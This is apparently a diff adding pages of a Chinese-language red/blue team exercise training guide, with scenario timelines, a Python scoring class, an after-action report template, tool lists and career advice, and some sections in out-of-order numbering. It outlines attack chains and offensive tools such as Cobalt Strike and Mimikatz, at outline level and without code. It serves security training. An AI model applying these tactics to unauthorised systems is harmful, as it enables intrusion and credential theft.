+<tr><td>R-04</td><td>关键人员缺席</td><td>3</td><td>3</td><td>9 (中)</td><td>制定替补计划、提前确认排班</td><td>白队协调</td></tr>
+<tr><td>R-05</td><td>攻击影响用户体验</td><td>2</td><td>3</td><td>6 (中)</td><td>制定通知模板，预留回滚时间</td><td>白队+业务</td></tr>
+</tbody></table>
+</div>
+<h3 id="55-演练信息披露模板"><a class="header" href="#55-演练信息披露模板">5.5 演练信息披露模板</a></h3>
+<pre><code class="language-markdown">致：全体员工
+主题：关于XX攻防演练的通知
+时间：2024年5月6日-5月17日（每日09:00-18:00）
+范围：公司内网办公系统、VPN、部分业务系统
+影响：演练期间可能出现登录告警、邮件通知，请按照指引反馈
+应对：如遇异常请及时联系SOC（soc@corp.com / 400-xxx-xxxx）
+说明：本次演练已获得授权，不会影响生产数据安全。如有疑问请联系白队负责人。
+</code></pre>
+<h3 id="56-演练报告速查表"><a class="header" href="#56-演练报告速查表">5.6 演练报告速查表</a></h3>
+<ul>
+<li><code>Executive Summary</code>：整体目标、成效、评分、关键风险。</li>
+<li><code>Findings Table</code>：高/中/低风险列表、影响、建议、负责人、截止时间。</li>
+<li><code>Attack Path</code>：图形化展示攻击链（工具：draw.io、PowerPoint、Obsidian Canvas）。</li>
+<li><code>Detection &amp; Response Timeline</code>：图表展示MTTD、MTTR、关键告警。</li>
+<li><code>Improvement Backlog</code>：行动项编号、描述、责任人、目标日期、状态。</li>
+<li><code>Appendix</code>：日志样本、截图、命令、哈希值、参考资料。</li>
+</ul>
+<h3 id="52-场景设计"><a class="header" href="#52-场景设计">5.2 场景设计</a></h3>
+<h4 id="apt攻击模拟场景"><a class="header" href="#apt攻击模拟场景">APT攻击模拟场景</a></h4>
+<p><strong>攻击链设计</strong>:</p>
+<pre><code>场景: APT组织针对性攻击
+
+第1天 - 侦察阶段:
+├── OSINT信息收集
+├── 子域名枚举
+├── 社交媒体情报
+└── 邮箱地址收集
+
+第2-3天 - 初始访问:
+├── 钓鱼邮件发送
+├── 水坑攻击部署
+├── VPN暴力破解
+└── 供应链投毒
+
+第4-5天 - 立足点建立:
+├── Webshell上传
+├── Beacon部署
+├── 权限提升
+└── 持久化机制
+
+第6-7天 - 内网渗透:
+├── 凭证获取
+├── 横向移动
+├── 域控渗透
+└── 数据窃取
+
+评分标准:
+- 红队成功突破: 10分/阶段
+- 蓝队成功检测: -5分/次
+- 蓝队成功遏制: -10分/次
+- 未被发现完成任务: 额外20分
+</code></pre>
+<p><strong>蓝队响应场景</strong>:</p>
+<pre><code>场景: 勒索软件攻击响应
+
+T+0分钟 - 检测:
+└── SIEM告警触发（异常加密行为）
+
+T+15分钟 - 初步响应:
+├── 隔离受感染主机
+├── 通知响应团队
+└── 记录初始信息
+
+T+1小时 - 深入分析:
+├── 确定感染范围
+├── 识别初始入侵点
+├── 提取恶意样本
+└── 阻断C2通信
+
+T+4小时 - 遏制根除:
+├── 隔离所有受影响系统
+├── 重置被盗凭证
+├── 修补漏洞
+└── 清理恶意软件
+
+T+24小时 - 恢复:
+├── 从备份恢复数据
+├── 重建受感染系统
+└── 验证完整性
+
+T+1周 - 复盘:
+├── 编写事件报告
+├── 更新检测规则
+└── 团队培训
+
+评分标准:
+- 15分钟内隔离: 100分
+- 1小时内确定范围: 80分
+- 4小时内遏制威胁: 60分
+- 24小时内恢复业务: 40分
+</code></pre>
+<h3 id="53-效果评估"><a class="header" href="#53-效果评估">5.3 效果评估</a></h3>
+<p><strong>评估指标体系</strong>:</p>
+<pre><code class="language-python">class RedBlueMetrics:
+    def __init__(self):
+        self.metrics = {
+            'red_team': {
+                'ttc': 0,  # Time to Compromise (突破时间)
+                'ttp': 0,  # Time to Privilege (提权时间)
+                'ttd': 0,  # Time to Domain (域控时间)
+                'detection_rate': 0,  # 被检测率
+                'techniques_used': [],  # 使用的技术
+                'success_rate': 0  # 成功率
+            },
+            'blue_team': {
+                'ttd': 0,  # Time to Detect (检测时间)
+                'ttr': 0,  # Time to Respond (响应时间)
+                'ttc': 0,  # Time to Contain (遏制时间)
+                'tte': 0,  # Time to Eradicate (根除时间)
+                'false_positive_rate': 0,  # 误报率
+                'coverage': 0  # 覆盖率
+            }
+        }
+
+    def calculate_red_team_score(self):
+        """
+        计算红队得分
+        """
+        score = 0
+
+        # 突破速度得分（越快越高）
+        if self.metrics['red_team']['ttc'] &lt; 3600:  # 1小时
+            score += 50
+        elif self.metrics['red_team']['ttc'] &lt; 86400:  # 1天
+            score += 30
+        else:
+            score += 10
+
+        # 隐蔽性得分
+        detection_penalty = self.metrics['red_team']['detection_rate'] * 10
+        score -= detection_penalty
+
+        # 技术多样性得分
+        techniques_bonus = len(self.metrics['red_team']['techniques_used']) * 2
+        score += techniques_bonus
+
+        return max(0, score)
+
+    def calculate_blue_team_score(self):
+        """
+        计算蓝队得分
+        """
+        score = 0
+
+        # 检测速度得分
+        if self.metrics['blue_team']['ttd'] &lt; 300:  # 5分钟
+            score += 50
+        elif self.metrics['blue_team']['ttd'] &lt; 1800:  # 30分钟
+            score += 30
+        else:
+            score += 10
+
+        # 响应效率得分
+        total_response_time = (
+            self.metrics['blue_team']['ttr'] +
+            self.metrics['blue_team']['ttc'] +
+            self.metrics['blue_team']['tte']
+        )
+
+        if total_response_time &lt; 3600:  # 1小时
+            score += 40
+        elif total_response_time &lt; 14400:  # 4小时
+            score += 20
+
+        # 准确性得分
+        accuracy_bonus = (1 - self.metrics['blue_team']['false_positive_rate']) * 30
+        score += accuracy_bonus
+
+        return score
+
+    def generate_report(self):
+        """
+        生成评估报告
+        """
+        red_score = self.calculate_red_team_score()
+        blue_score = self.calculate_blue_team_score()
+
+        report = f"""
+# 红蓝对抗演练评估报告
+
+## 红队表现
+- 综合得分: {red_score}/100
+- 突破用时: {self.metrics['red_team']['ttc']}秒
+- 提权用时: {self.metrics['red_team']['ttp']}秒
+- 被检测率: {self.metrics['red_team']['detection_rate']*100}%
+- 使用技术: {len(self.metrics['red_team']['techniques_used'])}种
+
+## 蓝队表现
+- 综合得分: {blue_score}/100
+- 平均检测时间: {self.metrics['blue_team']['ttd']}秒
+- 平均响应时间: {self.metrics['blue_team']['ttr']}秒
+- 平均遏制时间: {self.metrics['blue_team']['ttc']}秒
+- 误报率: {self.metrics['blue_team']['false_positive_rate']*100}%
+
+## 对抗结果
+{"红队获胜" if red_score &gt; blue_score else "蓝队获胜"}
+        """
+
+        return report
+</code></pre>
+<h3 id="54-复盘总结"><a class="header" href="#54-复盘总结">5.4 复盘总结</a></h3>
+<p><strong>复盘框架</strong>:</p>
+<pre><code class="language-markdown"># 红蓝对抗演练复盘报告
+
+## 1. 执行摘要
+- 演练时间: 2024年X月X日 - X月X日
+- 参演人员: 红队5人，蓝队8人，白队2人
+- 演练范围: XX系统、XX网络
+- 主要发现: X个高危漏洞，X个中危漏洞
+
+## 2. 红队战术分析
+
+### 2.1 成功战术
+- ✅ 钓鱼邮件成功率: 30% (发送100封，成功30次)
+- ✅ 权限提升: 利用MS16-032成功提升至SYSTEM
+- ✅ 横向移动: Pass-the-Hash攻击成功移动到5台主机
+- ✅ 持久化: WMI事件订阅持久化未被发现
+
+### 2.2 失败战术
+- ❌ Mimikatz执行被EDR拦截
+- ❌ 端口扫描触发IDS告警
+- ❌ C2通信被防火墙阻断
+
+### 2.3 攻击时间线
+</code></pre>
+<p>Day 1:
+09:00 - 开始OSINT收集
+14:00 - 发现子域名takeover漏洞
+18:00 - 成功获得初始访问</p>
+<p>Day 2:
+10:00 - 部署Cobalt Strike Beacon
+12:00 - 权限提升至SYSTEM
+15:00 - 提取本地凭证
+18:00 - 横向移动到跳板机</p>
+<p>Day 3:
+09:00 - 继续横向移动
+14:00 - 接近域控制器
+16:00 - 被蓝队发现并遏制</p>
+<pre><code>
+## 3. 蓝队防御分析
+
+### 3.1 检测成功案例
+- ✅ SIEM检测到异常PowerShell活动（T+2小时）
+- ✅ EDR拦截Mimikatz执行（T+1天）
+- ✅ 网络监控发现异常外联（T+2天）
+
+### 3.2 检测失败案例
+- ❌ 钓鱼邮件未被识别
+- ❌ WMI持久化未被检测
+- ❌ 首次横向移动未告警
+
+### 3.3 响应时间线
+</code></pre>
+<p>T+2小时: 首次告警（PowerShell异常）
+T+2小时15分: 安全分析师开始调查
+T+3小时: 确认为红队活动
+T+4小时: 开始遏制措施
+T+1天: 完全遏制威胁</p>
+<pre><code>
+## 4. 发现的安全问题
+
+### 4.1 高危问题
+1. **未修补的系统漏洞** (严重)
+   - 影响: 10台服务器存在MS16-032漏洞
+   - 建议: 立即安装安全补丁
+   - 责任人: 系统管理员
+   - 修复期限: 1周内
+
+2. **弱密码策略** (高危)
+   - 影响: 30%账户使用弱密码
+   - 建议: 强制复杂密码策略
+   - 责任人: AD管理员
+   - 修复期限: 2周内
+
+### 4.2 中危问题
+1. **缺少多因素认证**
+   - 影响: VPN和管理后台未启用MFA
+   - 建议: 部署MFA解决方案
+   - 责任人: 安全团队
+   - 修复期限: 1个月
+
+2. **日志留存不足**
+   - 影响: 仅保留7天日志
+   - 建议: 延长至90天
+   - 责任人: 运维团队
+   - 修复期限: 2周内
+
+## 5. 改进建议
+
+### 5.1 技术层面
+- [ ] 部署EDR到所有终端
+- [ ] 更新SIEM检测规则
+- [ ] 实施网络分段
+- [ ] 启用LSA保护
+- [ ] 部署欺骗技术（Honeypot）
+
+### 5.2 流程层面
+- [ ] 建立应急响应手册
+- [ ] 定期安全培训
+- [ ] 漏洞管理流程
+- [ ] 变更管理加固
+
+### 5.3 人员层面
+- [ ] 增加安全分析师
+- [ ] 威胁狩猎培训
+- [ ] 红蓝对抗定期化
+
+## 6. 下次演练计划
+- 时间: 3个月后
+- 重点: 验证改进措施有效性
+- 新增场景: 供应链攻击模拟
+</code></pre>
+<hr />
+<h2 id="模块六工具平台与自动化"><a class="header" href="#模块六工具平台与自动化">模块六：工具平台与自动化</a></h2>
+<h3 id="模块总览工具视角"><a class="header" href="#模块总览工具视角">模块总览（工具视角）</a></h3>
+<ul>
+<li><strong>目标</strong>：搭建红蓝对抗全链路工具生态，覆盖情报收集、攻击执行、检测响应、取证复盘与自动化编排。</li>
+<li><strong>策略</strong>：开源 + 商业 + 自研组合，遵循“安全、可控、可审计”原则，确保工具使用合规并形成资产管理。</li>
+<li><strong>输出</strong>：
+<ul>
+<li>工具能力矩阵（功能、成本、适用场景、风险）</li>
+<li>自动化流水线设计（CI/CD、SOAR、IaC）</li>
+<li>工具管理制度（评估、引入、升级、退役）</li>
+</ul>
+</li>
+</ul>
+<h4 id="工具治理流程"><a class="header" href="#工具治理流程">工具治理流程</a></h4>
+<ol>
+<li><strong>需求评估</strong>：识别工具用途、适配场景、替代方案。</li>
+<li><strong>风险评估</strong>：检查授权协议、供应链安全、功能限制。</li>
+<li><strong>引入测试</strong>：在隔离环境测试功能、兼容性、日志输出。</li>
+<li><strong>上线登记</strong>：纳入CMDB或工具台账，定义负责人与维护周期。</li>
+<li><strong>使用监控</strong>：记录使用日志、数据流向、敏感操作审批；关键工具启用多因素认证。</li>
+<li><strong>定期复核</strong>：半年一次安全评估，确定是否升级或退役。</li>
+</ol>
+<h3 id="61-红队工具箱"><a class="header" href="#61-红队工具箱">6.1 红队工具箱</a></h3>
+<p><strong>C2框架对比</strong>:</p>
+<pre><code>框架          | 优势                    | 劣势
+-------------|------------------------|------------------
+Cobalt Strike | 成熟稳定、功能强大        | 商业软件、特征明显
+Metasploit   | 免费开源、模块丰富        | 流量特征明显
+Empire       | PowerShell原生、隐蔽性好  | 已停止维护
+Covenant     | .NET原生、灵活性强        | 社区较小
+Sliver       | 现代化、隐蔽性好          | 相对较新
+</code></pre>
+<p><strong>推荐工具组合</strong>:</p>
+<pre><code class="language-bash"># 信息收集
+- Amass: 子域名枚举
+- theHarvester: OSINT收集
+- Shodan CLI: 互联网资产搜索
+
+# 漏洞扫描
+- Nmap: 端口服务扫描
+- Nuclei: 漏洞模板扫描
+- Nessus: 综合漏洞扫描
+
+# 漏洞利用
+- Metasploit: 综合渗透框架
+- Impacket: 协议工具集
+- CrackMapExec: 内网渗透
+
+# 后渗透
+- Mimikatz: 凭证提取
+- BloodHound: AD分析
+- Empire: PowerShell后渗透
+
+# C2通信
+- Cobalt Strike: 企业级C2
+- Sliver: 现代化C2
+- Mythic: 模块化C2
+</code></pre>
+<h3 id="对抗自动化流水线示例"><a class="header" href="#对抗自动化流水线示例">对抗自动化流水线示例</a></h3>
+<pre><code>┌─────────────┐     ┌─────────────┐     ┌──────────────┐     ┌──────────────┐
+│ Git 仓库     │ --&gt; │ CI/CD 平台    │ --&gt; │ 目标环境/靶场   │ --&gt; │ SOAR/告警平台 │
+│ (脚本/规则) │     │ (GitLab CI) │     │  (IaC部署)     │     │  (Cortex/XSOAR)│
+└─────────────┘     └─────────────┘     └──────────────┘     └──────────────┘
+        │                    │                    │                    │
+        ▼                    ▼                    ▼                    ▼
+  代码评审(PR)      自动测试/验证        自动执行攻击场景       自动创建响应工单
+</code></pre>
+<p><strong>阶段说明</strong>：</p>
+<ol>
+<li><strong>脚本/规则仓库</strong>：统一管理红队攻击脚本、蓝队检测规则、SOAR Playbook。提交前须通过代码规范与安全审计。</li>
+<li><strong>CI/CD验证</strong>：运行单元测试、静态扫描、原子化验证（Invoke-Atomic）、模拟数据测试Sigma规则，自动生成报告。</li>
+<li><strong>靶场部署</strong>：通过Terraform/Ansible自动创建演练环境、部署C2、模拟资产、日志管道。</li>
+<li><strong>SOAR联动</strong>：当规则触发时自动生成工单、执行隔离脚本、触发取证采集，并同步攻防看板。</li>
+<li><strong>归档与销毁</strong>：演练结束后自动导出日志、证据，销毁临时基础设施，更新CMDB。</li>
+</ol>
+<h3 id="62-蓝队工具箱"><a class="header" href="#62-蓝队工具箱">6.2 蓝队工具箱</a></h3>
+<p><strong>SIEM平台对比</strong>:</p>
+<pre><code>平台         | 优势                    | 劣势
+------------|------------------------|------------------
+Splunk      | 功能强大、生态丰富        | 价格昂贵
+ELK Stack   | 免费开源、可定制性强      | 需要维护
+QRadar      | IBM支持、集成度高        | 价格高、复杂
+ArcSight    | 成熟稳定                | 学习曲线陡峭
+</code></pre>
+<p><strong>推荐工具组合</strong>:</p>
+<pre><code class="language-bash"># 日志收集
+- Sysmon: Windows系统监控
+- Auditd: Linux审计
+- Osquery: 跨平台查询
+- Beats: 轻量级采集器
+
+# 威胁检测
+- Zeek: 网络流量分析
+- Suricata: IDS/IPS
+- YARA: 恶意软件检测
+- Sigma: 检测规则标准
+
+# 端点防护
+- Windows Defender ATP
+- CrowdStrike Falcon
+- Carbon Black
+- SentinelOne
+
+# 威胁情报
+- MISP: 威胁情报平台
+- OpenCTI: 威胁情报管理
+- AlienVault OTX: 社区情报
+
+# 应急响应
+- Volatility: 内存取证
+- Autopsy: 磁盘取证
+- Wireshark: 流量分析
+- KAPE: 快速取证
+</code></pre>
+<hr />
+<h2 id="模块七学习验证与能力度量"><a class="header" href="#模块七学习验证与能力度量">模块七：学习验证与能力度量</a></h2>
+<h3 id="模块总览度量视角"><a class="header" href="#模块总览度量视角">模块总览（度量视角）</a></h3>
+<ul>
+<li><strong>目的</strong>：构建覆盖个人、团队、组织层面的能力评价体系，确保学习与演练成果可量化、可追踪、可复用。</li>
+<li><strong>评估维度</strong>：技能、流程、工具、协同、成果、影响力。</li>
+<li><strong>输出</strong>：能力雷达、OKR指标、演练KPI、学习日志模板、作品集指南。</li>
+</ul>
+<h4 id="红蓝对抗kpi参考"><a class="header" href="#红蓝对抗kpi参考">红蓝对抗KPI参考</a></h4>
+<div class="table-wrapper"><table><thead><tr><th>指标类别</th><th>指标名称</th><th>描述</th><th>目标值</th><th>备注</th></tr></thead><tbody>
+<tr><td>检测效率</td><td>MTTD (Mean Time To Detect)</td><td>从攻击发生到告警触发的平均时间</td><td>&lt; 15 分钟</td><td>关键资产 &lt;5 分钟</td></tr>
+<tr><td>响应效率</td><td>MTTR (Mean Time To Respond)</td><td>从告警到采取行动的平均时间</td><td>&lt; 30 分钟</td><td>高危告警优先</td></tr>
+<tr><td>演练覆盖</td><td>MITRE覆盖率</td><td>ATT&amp;CK战术覆盖数量 / 总战术数</td><td>≥ 80%</td><td>核心技术 ≥ 70%</td></tr>
+<tr><td>改进闭环</td><td>行动项关闭率</td><td>30天内完成的改进项 / 总数</td><td>≥ 85%</td><td>白队负责跟踪</td></tr>
+<tr><td>学习沉淀</td><td>知识输出频率</td><td>博客/分享/工具更新次数</td><td>≥ 2次/月</td><td>团队共建</td></tr>
+</tbody></table>
+</div>
+<h4 id="个人成长okr示例"><a class="header" href="#个人成长okr示例">个人成长OKR示例</a></h4>
+<ul>
+<li><strong>Objective</strong>：成为能够独立主持红蓝对抗演练的专家。
+<ul>
+<li>KR1：完成不少于3次红队与蓝队双角色演练并交付报告。</li>
+<li>KR2：输出12篇演练复盘或技术文章，并在社区分享≥2次。</li>
+<li>KR3：将团队检测覆盖率提升到80%，新增≥10条高质量检测规则。</li>
+</ul>
+</li>
+</ul>
+<h3 id="-阶段一基础理论2周"><a class="header" href="#-阶段一基础理论2周">✅ 阶段一：基础理论（2周）</a></h3>
+<ul>
+<li><input disabled="" type="checkbox"/>
+理解红蓝对抗核心概念</li>
+<li><input disabled="" type="checkbox"/>
+掌握MITRE ATT&amp;CK框架</li>
+<li><input disabled="" type="checkbox"/>
+了解常见攻击技术</li>
+<li><input disabled="" type="checkbox"/>
+熟悉基础防御策略</li>
+</ul>
+<h3 id="-阶段二红队技能6周"><a class="header" href="#-阶段二红队技能6周">✅ 阶段二：红队技能（6周）</a></h3>
+<ul>
+<li><input disabled="" type="checkbox"/>
+掌握3种以上初始访问技术</li>
+<li><input disabled="" type="checkbox"/>
+能够使用Cobalt Strike/Metasploit</li>
+<li><input disabled="" type="checkbox"/>
+熟练进行权限提升</li>
+<li><input disabled="" type="checkbox"/>
+掌握横向移动技术</li>
+<li><input disabled="" type="checkbox"/>
+完成10个内网靶机</li>
+</ul>
+<h3 id="-阶段三蓝队技能6周"><a class="header" href="#-阶段三蓝队技能6周">✅ 阶段三：蓝队技能（6周）</a></h3>
+<ul>
+<li><input disabled="" type="checkbox"/>
+部署并配置SIEM系统</li>
+<li><input disabled="" type="checkbox"/>
+编写检测规则</li>
+<li><input disabled="" type="checkbox"/>
+进行威胁狩猎</li>
+<li><input disabled="" type="checkbox"/>
+执行应急响应流程</li>
+<li><input disabled="" type="checkbox"/>
+完成3次取证分析</li>
+</ul>
+<h3 id="-阶段四紫队协同2周"><a class="header" href="#-阶段四紫队协同2周">✅ 阶段四：紫队协同（2周）</a></h3>
+<ul>
+<li><input disabled="" type="checkbox"/>
+使用Atomic Red Team测试</li>
+<li><input disabled="" type="checkbox"/>
+部署Caldera平台</li>
+<li><input disabled="" type="checkbox"/>
+优化检测规则</li>
+<li><input disabled="" type="checkbox"/>
+完善响应流程</li>
+</ul>
+<h3 id="-阶段五实战演练4周"><a class="header" href="#-阶段五实战演练4周">✅ 阶段五：实战演练（4周）</a></h3>
+<ul>
+<li><input disabled="" type="checkbox"/>
+参与完整红蓝对抗演练</li>
+<li><input disabled="" type="checkbox"/>
+编写演练报告</li>
+<li><input disabled="" type="checkbox"/>
+实施改进措施</li>
+<li><input disabled="" type="checkbox"/>
+通过相关认证（GPEN/GCIH）</li>
+</ul>
+<h3 id="能力雷达自评表"><a class="header" href="#能力雷达自评表">能力雷达自评表</a></h3>
+<div class="table-wrapper"><table><thead><tr><th>能力维度</th><th>等级1描述</th><th>等级3描述</th><th>等级5描述</th><th>当前评分</th><th>目标评分</th></tr></thead><tbody>
+<tr><td>红队攻击</td><td>仅熟悉常规工具使用</td><td>能够定制Payload、构建攻击链</td><td>具备APT模拟能力、可开发自研工具</td><td></td><td></td></tr>
+<tr><td>蓝队检测</td><td>能分析单条告警</td><td>能设计检测规则与仪表板</td><td>构建自动化检测平台并持续优化</td><td></td><td></td></tr>
+<tr><td>紫队协同</td><td>被动参与复盘</td><td>能主持小型验证活动</td><td>推动攻防常态化、指标体系化</td><td></td><td></td></tr>
+<tr><td>流程治理</td><td>了解基本流程</td><td>能编写演练SOP、报告</td><td>设计全局治理体系、指标闭环</td><td></td><td></td></tr>
+<tr><td>沟通影响</td><td>内部分享</td><td>组织跨部门培训</td><td>对外演讲、行业影响力</td><td></td><td></td></tr>
+</tbody></table>
+</div>
+<h3 id="能力档案夹portfolio建议"><a class="header" href="#能力档案夹portfolio建议">能力档案夹（Portfolio）建议</a></h3>
+<ul>
+<li><strong>项目文档</strong>：授权书、计划书、日报、复盘报告。</li>
+<li><strong>技术成果</strong>：脚本、检测规则、自动化剧本、工具说明。</li>
+<li><strong>演讲输出</strong>：PPT、视频、博客、播客、社区帖子。</li>
+<li><strong>指标证据</strong>：MTTD/MTTR改进前后对比、检测覆盖率图表。</li>
+<li><strong>荣誉认证</strong>：证书、竞赛成绩、客户推荐、内部表彰。</li>
+</ul>
+<h3 id="学习节奏与复盘机制"><a class="header" href="#学习节奏与复盘机制">学习节奏与复盘机制</a></h3>
+<ul>
+<li><strong>季度复盘</strong>：
+<ol>
+<li>汇总演练次数、成功率、风险闭环。</li>
+<li>更新能力雷达图，制定下季度OKR。</li>
+<li>评估工具库更新情况、自动化覆盖率。</li>
+</ol>
+</li>
+<li><strong>月度冲刺</strong>：
+<ul>
+<li>设置主题（如“云攻防月”“APT模拟月”）。</li>
+<li>每周输出至少一篇复盘或技术文章。</li>
+<li>组织一次红蓝知识分享会。</li>
+</ul>
+</li>
+<li><strong>每日例行</strong>：
+<ul>
+<li>Morning Brief：关注最新CVE、威胁情报。</li>
+<li>Evening Wrap：记录当日亮点与问题。</li>
+</ul>
+</li>
+</ul>
+<h3 id="学习社群运营建议"><a class="header" href="#学习社群运营建议">学习社群运营建议</a></h3>
+<ul>
+<li>建立内部Wiki或Notion“攻防知识库”。</li>
+<li>每周开展一次Lightning Talk（10分钟快速分享）。</li>
+<li>启动“师徒制”：初级工程师配对资深导师。</li>
+<li>设立“攻防之星”奖项，表彰优秀贡献。</li>
+<li>与外部社区联动：OWASP、本地安全沙龙、SRC Meetup。</li>
+</ul>
+<hr />
+<hr />
+<h2 id="模块八资源拓展与行业洞察"><a class="header" href="#模块八资源拓展与行业洞察">模块八：资源拓展与行业洞察</a></h2>
+<h3 id="模块总览资源视角"><a class="header" href="#模块总览资源视角">模块总览（资源视角）</a></h3>
+<ul>
+<li><strong>目的</strong>：构建多层次学习与情报获取渠道，确保技术、流程、行业趋势同步更新。</li>
+<li><strong>结构</strong>：书籍 → 课程 → 平台 → 社区 → 情报 → 赛事 → 论坛。</li>
+<li><strong>策略</strong>：核心资源（必修）、拓展资源（选修）、实战资源（练习）、洞察资源（趋势）。</li>
+</ul>
+<h3 id="-推荐书籍"><a class="header" href="#-推荐书籍">📚 推荐书籍</a></h3>
+<ol>
+<li><strong>《Red Team: How to Succeed By Thinking Like the Enemy》</strong> - 红队思维</li>
+<li><strong>《Blue Team Handbook》</strong> - 蓝队实战手册</li>
+<li><strong>《Applied Incident Response》</strong> - 应急响应实践</li>
+<li><strong>《The Art of Network Penetration Testing》</strong> - 网络渗透艺术</li>
+</ol>
+<h3 id="-在线课程"><a class="header" href="#-在线课程">🎓 在线课程</a></h3>
+<ul>
+<li>SANS SEC564: Red Team Operations</li>
+<li>SANS SEC555: SIEM Implementation</li>
+<li>Offensive Security: OSCP/OSEP</li>
+<li>eLearnSecurity: eCIR (数字取证)</li>
+</ul>
+<h3 id="-实战平台"><a class="header" href="#-实战平台">🔧 实战平台</a></h3>
+<ul>
+<li><strong>RangeForce</strong>: 蓝队培训平台</li>
+<li><strong>Immersive Labs</strong>: 红蓝对抗训练</li>
+<li><strong>Cyber Defenders</strong>: 蓝队挑战</li>
+<li><strong>Attack Defense</strong>: 在线对抗平台</li>
+</ul>
+<h3 id="-安全资讯"><a class="header" href="#-安全资讯">📰 安全资讯</a></h3>
+<ul>
+<li><strong>MITRE ATT&amp;CK</strong>: 战术知识库</li>
+<li><strong>SpecterOps Blog</strong>: 红队研究</li>
+<li><strong>Red Canary Blog</strong>: 威胁检测</li>
+<li><strong>DFIR Report</strong>: 事件响应报告</li>
+</ul>
+<h3 id="-推荐赛事与演练平台"><a class="header" href="#-推荐赛事与演练平台">⚔️ 推荐赛事与演练平台</a></h3>
+<div class="table-wrapper"><table><thead><tr><th>赛事/平台</th><th>类型</th><th>周期</th><th>说明</th></tr></thead><tbody>
+<tr><td>国家级护网</td><td>大型实战演练</td><td>每年</td><td>关注关键信息基础设施攻防，对流程和协同要求高</td></tr>
+<tr><td>XCTF联赛</td><td>攻防兼备</td><td>每年</td><td>涵盖Web、Pwn、逆向、取证等多领域</td></tr>
+<tr><td>红帽杯</td><td>企业攻防演练</td><td>每年</td><td>与真实企业环境结合，适合红蓝协同</td></tr>
+<tr><td>BlueHat/BlackHat Trainings</td><td>国际安全大会</td><td>每年</td><td>获取最新攻防技术，拓展视野</td></tr>
+<tr><td>ICS CTF</td><td>工控安全</td><td>每年</td><td>聚焦OT/ICS场景的攻防挑战</td></tr>
+</tbody></table>
+</div>
+<h3 id="-信息获取策略"><a class="header" href="#-信息获取策略">🗞️ 信息获取策略</a></h3>
+<ul>
+<li><strong>每日</strong>：RSS订阅（SecurityWeek、BleepingComputer、FreeBuf）、Twitter/X安全账号、Telegram情报频道。</li>
+<li><strong>每周</strong>：阅读DFIR Report、Mandiant博客、奇安信/腾讯科恩攻防研究、Azure/AWS安全公告。</li>
+<li><strong>每月</strong>：整理一份情报摘要（Top漏洞、Top攻击案例、检测建议）发送给团队。</li>
+<li><strong>事件驱动</strong>：当出现重大CVE（如Exchange ProxyLogon、Log4Shell），立即组织桌面演练。</li>
+</ul>
+<h3 id="-行业趋势观察"><a class="header" href="#-行业趋势观察">🧭 行业趋势观察</a></h3>
+<ul>
+<li><strong>云原生安全</strong>：关注供应链、容器逃逸、Kubernetes RBAC滥用；建议跟进KubeCon、CloudNativeSecurity。</li>
+<li><strong>AI辅助攻防</strong>：研究AI生成钓鱼内容、自动编码工具，同时关注AI模型安全（提示注入、模型窃取）。</li>
+<li><strong>零信任实践</strong>：跟踪NIST 800-207、高可信身份认证、微隔离方案的攻防对抗变化。</li>
+<li><strong>合规驱动</strong>：CSCC《网络安全漏洞报告要求》、等保2.0升级、安全运营与攻防演练纳入监管考核。</li>
+<li><strong>行业案例库</strong>：建议收集金融、制造、能源、医疗等典型行业攻防案例，形成行业专题库。</li>
+</ul>
+<hr />
+<hr />
+<h2 id="模块九职业发展与成长路径"><a class="header" href="#模块九职业发展与成长路径">模块九：职业发展与成长路径</a></h2>
+<h3 id="模块总览职业视角"><a class="header" href="#模块总览职业视角">模块总览（职业视角）</a></h3>
+<ul>
+<li><strong>目标</strong>：帮助学习者规划红队、蓝队、紫队乃至安全架构岗位的职业发展路径，明确技能栈、证书、项目经验、软技能与影响力建设。</li>
+<li><strong>方法</strong>：分层级评估 + 能力矩阵 + 作品集 + 产业圈层。</li>
+<li><strong>关键步骤</strong>：定位 → 积累 → 认证 → 输出 → 领导力。</li>
+</ul>
+<h3 id="红队工程师"><a class="header" href="#红队工程师">红队工程师</a></h3>
+<p><strong>初级（0-2年）</strong>:</p>
+<ul>
+<li>掌握基础渗透技术</li>
+<li>熟练使用主流工具</li>
+<li>参与红队项目</li>
+<li>年薪：20-35万</li>
+</ul>
+<p><strong>中级（2-5年）</strong>:</p>
+<ul>
+<li>独立完成红队项目</li>
+<li>开发自定义工具</li>
+<li>APT攻击模拟</li>
+<li>年薪：35-60万</li>
+</ul>
+<p><strong>高级（5年以上）</strong>:</p>
+<ul>
+<li>红队负责人</li>
+<li>0day研究</li>
+<li>培训团队</li>
+<li>年薪：60-100万+</li>
+</ul>
+<h3 id="蓝队工程师"><a class="header" href="#蓝队工程师">蓝队工程师</a></h3>
+<p><strong>初级（0-2年）</strong>:</p>
+<ul>
+<li>SOC分析师</li>
+<li>告警分类处理</li>
+<li>基础应急响应</li>
+<li>年薪：15-30万</li>
+</ul>
+<p><strong>中级（2-5年）</strong>:</p>
+<ul>
+<li>威胁狩猎分析师</li>
+<li>检测规则开发</li>
+<li>事件响应专家</li>
+<li>年薪：30-50万</li>
+</ul>
+<p><strong>高级（5年以上）</strong>:</p>
+<ul>
+<li>SOC架构师</li>
+<li>威胁情报专家</li>
+<li>应急响应负责人</li>
+<li>年薪：50-80万+</li>
+</ul>
+<h3 id="跨角色成长路径"><a class="header" href="#跨角色成长路径">跨角色成长路径</a></h3>
+<div class="table-wrapper"><table><thead><tr><th>年限</th><th>红队发展</th><th>蓝队发展</th><th>紫队/安全架构发展</th><th>建议证书</th><th>关键成果</th></tr></thead><tbody>
+<tr><td>0-1年</td><td>完成基础渗透课程，参与CTF</td><td>熟悉SIEM、日志分析</td><td>协助集成工具、学习流程</td><td>eJPT、CCSK</td><td>完成3次靶机演练、1次检测规则上线</td></tr>
+<tr><td>1-3年</td><td>主导小型红队项目，编写脚本</td><td>设计检测规则、响应手册</td><td>主持1-2个紫队场景、推动指标</td><td>OSCP、GCIA</td><td>输出10篇复盘、2个自动化脚本</td></tr>
+<tr><td>3-5年</td><td>构建攻击链、开发自研工具</td><td>统筹SOC、开展威胁狩猎</td><td>负责攻防计划、指标管理</td><td>OSEP、GCTI</td><td>完成大型演练、建立知识库</td></tr>
+<tr><td>5年以上</td><td>构建红队体系、0day研究</td><td>构建安全运营体系、引入SOAR</td><td>设计安全架构、推动安全治理</td><td>OSCE3、GSE</td><td>主导行业级演练、发表研究报告</td></tr>
+</tbody></table>
+</div>
+<h3 id="影响力建设指南"><a class="header" href="#影响力建设指南">影响力建设指南</a></h3>
+<ol>
